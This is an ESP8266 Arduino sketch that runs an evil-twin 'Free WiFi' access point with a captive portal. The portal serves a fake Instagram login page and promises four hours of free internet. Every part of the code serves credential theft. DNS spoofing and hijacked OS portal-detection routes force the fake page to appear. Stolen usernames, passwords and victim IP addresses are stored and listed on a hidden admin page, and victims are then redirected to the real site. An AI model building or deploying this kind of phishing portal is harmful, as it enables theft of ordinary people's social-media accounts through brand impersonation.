#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// Network credentials
const char* ssid = "Free WiFi";
const char* admin_password = "zaid46"; // Password to view credentials
const IPAddress apIP(192, 168, 4, 1);  // Changed IP to standard ESP8266 AP IP
const IPAddress subnet(255, 255, 255, 0);
const byte DNS_PORT = 53;

// Store up to 50 credentials
#define MAX_CREDENTIALS 50
struct Credential {
  String username;
  String password;
  String timestamp;
  String ip;
};
Credential credentials[MAX_CREDENTIALS];
int credentialCount = 0;

// For timestamp
unsigned long startTime;

DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Function prototypes
bool captivePortal();
void handleRoot();
void handleAdmin();
void handleLogin();

// Function implementations
bool captivePortal() {
  String host = webServer.hostHeader();
  if (host != apIP.toString() && host != "instagram.com" && host != "www.instagram.com") {
    webServer.sendHeader("Location", String("http://") + apIP.toString(), true);
    webServer.send(302, "text/plain", "");
    return true;
  }
  return false;
}

void handleRoot() {
  if (captivePortal()) {
    return;
  }
  
  String page = R"(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; background: #fafafa; }
        .main { display: flex; flex-direction: column; align-items: center; margin-top: 12px; }
        .container { width: 350px; background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 10px 0; margin-bottom: 10px; }
        .logo { margin: 22px auto 12px; text-align: center; }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 40px;
          font-weight: bold;
          color: #262626;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          display: inline-block;
          margin: 10px auto;
          letter-spacing: -1px;
        }
        .wifi-message {
          text-align: center;
          background: #fff;
          padding: 15px;
          margin: 10px auto;
          width: 350px;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          color: #262626;
          font-size: 14px;
          line-height: 1.5;
        }
        .wifi-message h3 {
          color: #0095f6;
          margin: 0 0 10px 0;
          font-size: 16px;
        }
        form { padding: 0 40px; }
        input { width: 100%; background: #fafafa; padding: 9px 8px; margin: 6px 0; 
                border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; 
                font-size: 14px; color: #262626; }
        input:focus { border-color: #a8a8a8; outline: none; }
        button { width: 100%; background: #0095f6; color: white; padding: 7px 16px; 
                border: none; border-radius: 4px; font-weight: 600; font-size: 14px; 
                cursor: pointer; margin: 8px 0; }
        button:hover { background: #0086e0; }
        .divider { display: flex; align-items: center; margin: 10px 0 18px; }
        .line { flex-grow: 1; height: 1px; background: #dbdbdb; }
        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
        .footer { width: 350px; text-align: center; padding: 20px; }
        .footer a { color: #00376b; text-decoration: none; font-size: 12px; }
        .footer span { color: #8e8e8e; font-size: 12px; margin: 0 8px; }
      </style>
    </head>
    <body>
      <div class="main">
        <div class="wifi-message">
          <h3>Free WiFi Access</h3>
          <p>Login with Instagram to get 4 hours of free high-speed internet access. Connect with friends while enjoying our complimentary WiFi service.</p>
        </div>
        <div class="container">
          <div class="logo">
            <div class="instagram-logo">Instagram</div>
          </div>
          <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div class="divider">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>
          </form>
        </div>
        <div class="container" style="text-align: center; padding: 20px;">
          <span style="color: #262626; font-size: 14px;">Don't have an account? </span>
          <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none; font-size: 14px;">Sign up</a>
        </div>
        <div class="footer">
          <a href="#">About</a><span>•</span>
          <a href="#">Help</a><span>•</span>
          <a href="#">Privacy</a><span>•</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </body>
    </html>
  )";
  webServer.send(200, "text/html", page);
}

void handleAdmin() {
  if (webServer.method() == HTTP_POST) {
    if (webServer.arg("password") == admin_password) {
      String page = "<html><head><title>Saved Credentials</title>";
      page += "<style>body{font-family:Arial,sans-serif;margin:20px;} table{width:100%;border-collapse:collapse;} th,td{padding:8px;text-align:left;border:1px solid #ddd;} th{background-color:#f2f2f2;}</style>";
      page += "</head><body><h2>Saved Credentials</h2>";
      page += "<table><tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>";
      
      for (int i = 0; i < credentialCount; i++) {
        page += "<tr><td>" + credentials[i].timestamp + "</td>";
        page += "<td>" + credentials[i].ip + "</td>";
        page += "<td>" + credentials[i].username + "</td>";
        page += "<td>" + credentials[i].password + "</td></tr>";
      }
      
      page += "</table></body></html>";
      webServer.send(200, "text/html", page);
    } else {
      webServer.send(401, "text/html", "<html><body><h2>Invalid Password</h2><a href='/admin'>Try Again</a></body></html>");
    }
  } else {
    String page = R"(
      <!DOCTYPE html>
      <html>
      <head>
        <title>Admin Login</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          .container { max-width: 400px; margin: 0 auto; }
          input, button { padding: 10px; margin: 5px 0; width: 100%; }
          button { background: #007bff; color: white; border: none; cursor: pointer; }
        </style>
      </head>
      <body>
        <div class="container">
          <h2>View Saved Credentials</h2>
          <form method="POST">
            <input type="password" name="password" placeholder="Enter admin password" required>
            <button type="submit">View Credentials</button>
          </form>
        </div>
      </body>
      </html>
    )";
    webServer.send(200, "text/html", page);
  }
}

void handleLogin() {
  if (webServer.method() == HTTP_POST) {
    if (credentialCount < MAX_CREDENTIALS) {
      String username = webServer.arg("username");
      String password = webServer.arg("password");
      
      // Calculate elapsed time in seconds
      unsigned long elapsedSeconds = (millis() - startTime) / 1000;
      unsigned long hours = elapsedSeconds / 3600;
      unsigned long minutes = (elapsedSeconds % 3600) / 60;
      unsigned long seconds = elapsedSeconds % 60;
      
      // Store new credential
      credentials[credentialCount].username = username;
      credentials[credentialCount].password = password;
      credentials[credentialCount].timestamp = String(hours) + ":" + 
                                             (minutes < 10 ? "0" : "") + String(minutes) + ":" + 
                                             (seconds < 10 ? "0" : "") + String(seconds);
      credentials[credentialCount].ip = webServer.client().remoteIP().toString();
      credentialCount++;
      
      // Print to Serial for debugging
      Serial.println("New credentials captured:");
      Serial.println("Username: " + username);
      Serial.println("Password: " + password);
    }
    
    // Redirect to real Instagram
    webServer.sendHeader("Location", "https://www.instagram.com");
    webServer.send(302, "text/plain", "");
  }
}

void setup() {
  Serial.begin(115200);
  
  // Initialize start time
  startTime = millis();
  
  // Setup AP with specific IP and subnet
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(ssid);

  // Start DNS server to redirect all requests
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  // Add all captive portal handlers
  webServer.on("/", handleRoot);
  webServer.on("/login", handleLogin);
  webServer.on("/admin", handleAdmin);
  webServer.on("/generate_204", handleRoot);  // Android captive portal
  webServer.on("/fwlink", handleRoot);        // Microsoft captive portal
  webServer.on("/hotspot-detect.html", handleRoot); // Apple captive portal
  webServer.on("/canonical.html", handleRoot); // Apple captive portal
  webServer.on("/success.txt", handleRoot);    // Apple captive portal
  webServer.onNotFound([]() {
    if (!captivePortal()) {
      handleRoot();
    }
  });
  webServer.begin();

  Serial.println("Portal started!");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  Serial.println("Admin page: http://" + WiFi.softAPIP().toString() + "/admin");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}